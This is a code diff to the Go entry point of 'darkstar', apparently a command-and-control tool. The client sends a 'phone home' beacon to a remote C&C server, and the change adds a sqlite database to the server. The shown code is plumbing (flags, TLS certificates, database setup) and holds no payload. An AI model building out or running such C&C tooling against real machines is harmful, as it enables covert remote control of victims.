@@ -11,6 +11,7 @@ import (
 	"github.com/AlexsJones/darkstar/net/server"
 	"github.com/AlexsJones/darkstar/tls"
 	"github.com/gogo/protobuf/proto"
+	"github.com/jinzhu/gorm"
 	uuid "github.com/nu7hatch/gouuid"
 )
 
@@ -20,6 +21,7 @@ func main() {
 	var serverHostAddress = flag.String("serverhostaddress", "0.0.0.0", "Remote darkstar server address")
 	var serverPort = flag.Int("serverport", 8080, "Server port")
 	var serverMode = flag.String("servermode", "scavange", "Sets the remote C&C operation")
+	var serverSQLLite = flag.String("serverdbpath", "darkstar.db", "Set the sqlite3 database")
 	flag.Parse()
 
 	switch *mode {
@@ -32,7 +34,7 @@ func main() {
 			os.Exit(1)
 		}
 
-		//Create the initial phone home message
+		//Create the initial phone home message------------------------------------
 		message := &message.Message{}
 		u, err := uuid.NewV4()
 		if err != nil {
@@ -45,22 +47,31 @@ func main() {
 			log.Printf(err.Error())
 			os.Exit(1)
 		}
+		//--------------------------------------------------------------------------
 		config := &client.Configuration{Message: string(out),
 			Address: *serverHostAddress, CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath, Port: *clientPort}
 		client.Send(config)
 	default:
-
+		// Connect to database ----------------------------------------------------
+		db, err := gorm.Open("sqlite3", *serverSQLLite)
+		if err != nil {
+			panic("failed to connect database")
+		}
+		defer db.Close()
+		// ------------------------------------------------------------------------
+		// tls generate certs -----------------------------------------------------
 		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
 			RSABits: 2048, EcdsaCurve: "", CertPath: "server.pem", KeyPath: "server.key"}
 
 		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
 			os.Exit(1)
 		}
-
+		// ------------------------------------------------------------------------
 		conf := &server.Configuration{Address: "0.0.0.0", CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath,
 			Port:          *serverPort,
 			ClientHandler: server.ClientHandler,
 			Mode:          *serverMode,
+			Database:      db,
 		}
 		if err := server.Start(conf); err != nil {
 			log.Printf(err.Error())
